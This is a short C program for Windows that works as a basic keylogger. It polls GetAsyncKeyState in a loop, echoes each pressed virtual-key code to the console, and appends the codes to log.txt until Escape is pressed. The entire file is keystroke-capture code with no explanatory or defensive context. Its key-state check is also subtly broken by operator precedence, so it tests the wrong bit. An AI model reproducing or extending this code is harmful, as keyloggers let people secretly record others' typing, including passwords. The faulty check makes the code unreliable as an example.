#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>

int main()
{
    printf("Hello world!\n");
    int running = 1;
    FILE *fp;

    fp = fopen("log.txt","a");
    fprintf(fp,"testing");

    while(running){
        Sleep(10);
        for(int ch= 8;ch<=222;ch++){

            if((GetAsyncKeyState(ch)& 0x8000!=0)){
                printf("You pressed %i \n",ch);
                //fprintf(fp,ch);
                fputc(ch,fp);
                if(ch == 27){
                    running = 0;
                }
            }
        }
    }
    fclose(fp);
    getchar();
    return 0;
}
